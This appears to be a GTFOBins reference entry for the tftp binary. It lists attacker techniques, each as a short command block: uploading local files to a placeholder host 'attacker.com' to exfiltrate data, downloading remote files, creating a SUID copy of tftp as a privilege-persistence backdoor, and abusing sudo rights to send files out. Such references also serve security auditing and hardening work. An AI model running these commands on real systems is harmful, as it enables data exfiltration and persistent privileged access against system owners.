# GTFOBin: tftp

## File upload

It can exfiltrate files on the network.

Send local file to a TFTP server.

```
RHOST=attacker.com
tftp $RHOST
put file_to_send
```

## File download

It can download remote files.

Fetch a remote file from a TFTP server.

```
RHOST=attacker.com
tftp $RHOST
get file_to_get
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

Send local file to a TFTP server.

```
sudo install -m =xs $(which tftp) .

RHOST=attacker.com
./tftp $RHOST
put file_to_send
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

Send local file to a TFTP server.

```
RHOST=attacker.com
sudo tftp $RHOST
put file_to_send
```